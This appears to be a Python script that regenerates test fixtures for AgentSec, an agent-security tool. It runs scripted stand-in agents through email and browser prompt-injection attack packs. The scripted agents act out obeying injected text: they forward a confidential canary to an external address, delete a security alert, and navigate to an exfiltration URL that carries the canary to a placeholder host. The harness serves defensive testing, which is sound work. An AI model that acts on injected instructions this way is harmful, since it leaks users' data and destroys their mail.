"""Regenerate the email and browser attack-pack fixtures (AgentSec 0.8.0 report format).

    python tests/fixtures/generate_pack_fixtures.py /path/to/invaris-agentsec

The reports are real `run_suite` + `build_report` output from AgentSec's own pipeline (scenarios,
delivery tracking, AttackGoalEvaluator, inconclusive verdicts) over the engine's example email and
browser attack packs. The AGENTS ARE SCRIPTED STAND-INS defined below, not language models: they
exist to exercise every verdict the dashboard must show (findings, passed, inconclusive), so
nothing in these fixtures is a finding about any real model.

- email-baseline-report.json: obeys injected instructions it reads; on the clean-up task it only
  reads the inbox listing and never opens a message, so that scenario is INCONCLUSIVE.
- email-hardened-report.json: the same agent build hardened: opens every message, never acts on
  what a message says; on the vendor-thread task it stops at the listing (INCONCLUSIVE), so the
  baseline finding there must not be counted as fixed.
- browser-report.json: obeys injected instructions but never re-reads a page, so the mid-task
  (cloaked page) injection is never delivered and that scenario is INCONCLUSIVE.
- email-described-report.json (needs an AgentSec with `agentsec.verdicts`): the baseline agent again, written in
  the newer report format (scenario `delivery` and `attack_goals`), with the agent describing itself through
  `x_agentsec.agent` -- truthfully, as `backend: scripted`.

The first three are AgentSec 0.8.0-format reports and are kept as they are to test compatibility; pass file
names to regenerate only some of them, e.g. `... /path/to/invaris-agentsec email-described-report.json`.
"""
import importlib.util
import json
import sys
from pathlib import Path


def _load(name, path):
    spec = importlib.util.spec_from_file_location(name, str(path))
    mod = importlib.util.module_from_spec(spec)
    sys.modules[name] = mod
    spec.loader.exec_module(mod)
    return mod


def main(engine: Path, out: Path, only=()) -> None:
    sys.path.insert(0, str(engine))
    from agentsec.adapters import CallableAdapter
    from agentsec.policies import parse_policy
    from agentsec.reports.json_report import build_report
    from agentsec.runners import run_suite

    packs = engine / "examples" / "attack_packs"
    ep = _load("fixture_email_pack", packs / "email_agent_pack.py")
    bp = _load("fixture_browser_pack", packs / "browser_agent_pack.py")

    def calls_of(messages, names=None):
        out = []
        for m in messages:
            if m["role"] == "assistant":
                for tc in m.get("tool_calls") or []:
                    if names is None or tc["function"]["name"] in names:
                        out.append((tc["function"]["name"], json.loads(tc["function"]["arguments"] or "{}")))
        return out

    def tool_texts(messages):
        return [m["content"] for m in messages if m["role"] == "tool"]

    def strings(value):
        if isinstance(value, dict):
            return " ".join(strings(v) for v in value.values())
        if isinstance(value, list):
            return " ".join(strings(v) for v in value)
        return str(value)

    def read_text(messages):
        """Everything the agent has read, raw and JSON-decoded (results are JSON with escaped newlines)."""
        out = []
        for text in tool_texts(messages):
            out.append(text)
            try:
                out.append(strings(json.loads(text)))
            except ValueError:
                pass
        return " ".join(out)

    email_slots = [v for k, v in vars(ep).items() if k.endswith("_SLOT") and isinstance(v, str)]

    def email_agent(obey, stop_at_listing_for, describe=None):
        def fn(messages, tools):
            out = decide(messages, tools)
            if describe:
                out = {"content": out} if isinstance(out, str) else dict(out)
                out["agent"] = describe       # what a test double truthfully says about itself
            return out

        def decide(messages, tools):
            task = next(m["content"] for m in messages if m["role"] == "user")
            if messages[-1]["role"] == "user":
                return {"tool_calls": [{"name": "read_inbox", "arguments": {}}]}
            if stop_at_listing_for and stop_at_listing_for in task:
                return "Summary written from the inbox listing only."
            listing, opened = [], [a.get("message_id") for _, a in calls_of(messages, {"open_email"})]
            for text in tool_texts(messages):
                try:
                    data = json.loads(text)
                except ValueError:
                    continue
                if isinstance(data, dict) and "messages" in data:
                    listing = [x["id"] for x in data["messages"]]
            for mid in listing:
                if mid not in opened:
                    return {"tool_calls": [{"name": "open_email", "arguments": {"message_id": mid}}]}
            bodies = read_text(messages)
            acted = {n for n, _ in calls_of(messages)} & {"forward_email", "send_email", "delete_email"}
            if obey and not acted and any(s in bodies for s in email_slots):
                if ep.DELETE_INJECTION_SLOT in bodies:
                    return {"tool_calls": [{"name": "delete_email", "arguments": {"message_id": ep.SECURITY_ALERT_ID}}]}
                return {"tool_calls": [{"name": "forward_email", "arguments": {
                    "message_id": "msg-0050", "to": ep.EXTERNAL_ADDRESS, "note": ep.CONFIDENTIAL_CANARY}}]}
            return "Triage complete."
        return CallableAdapter(fn)

    browser_slots = [v for k, v in vars(bp).items() if k.endswith("_SLOT") and isinstance(v, str)]
    account = "https://app.example-corp.invalid/account"
    product = "https://shop.example-vendor.invalid/item/42"

    def browser_agent():
        def fn(messages, tools):
            read = [a.get("url") for _, a in calls_of(messages, {"read_page", "fetch_page"})]
            for u in (account, product):
                if u not in read:       # reads each page once and never re-reads
                    return {"tool_calls": [{"name": "read_page", "arguments": {"url": u}}]}
            bodies = read_text(messages)
            if any(s in bodies for s in browser_slots) and "navigate" not in {n for n, _ in calls_of(messages)}:
                return {"tool_calls": [{"name": "navigate", "arguments": {
                    "url": "https://%s/collect?d=%s" % (bp.EXFIL_HOST, bp.BROWSER_CANARY)}}]}
            return "Browsing complete."
        return CallableAdapter(fn)

    def write(policy_file, adapter, name, seed=0):
        if only and name not in only:
            return
        rel = "examples/attack_packs/" + policy_file
        text = (packs / policy_file).read_text()
        # the pack paths in the policy are relative to the engine checkout
        policy = parse_policy(text.replace("examples/attack_packs/", str(packs) + "/"))
        suite = run_suite(policy, adapter, seed=seed)
        report = build_report(suite, rel)
        # the absolute pack path is machine-specific; record it the way the policy file spells it
        report = json.loads(json.dumps(report).replace(str(packs) + "/", "examples/attack_packs/"))
        report["generated_at"] = "2026-10-12T00:00:00+00:00"
        (out / name).write_text(json.dumps(report, indent=2, ensure_ascii=False) + "\n")
        print(name, report["summary"])

    write("email_assistant.agentsec.yaml", email_agent(True, ep.CLEANUP_TASK), "email-baseline-report.json")
    write("email_assistant.agentsec.yaml", email_agent(False, ep.THREAD_TASK), "email-hardened-report.json")
    write("browser_session.agentsec.yaml", browser_agent(), "browser-report.json")
    write("email_assistant.agentsec.yaml",
          email_agent(True, ep.CLEANUP_TASK, {"name": "email-assistant", "backend": "scripted", "configuration": "baseline"}),
          "email-described-report.json")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        raise SystemExit(__doc__)
    main(Path(sys.argv[1]).resolve(), Path(__file__).resolve().parent, tuple(sys.argv[2:]))
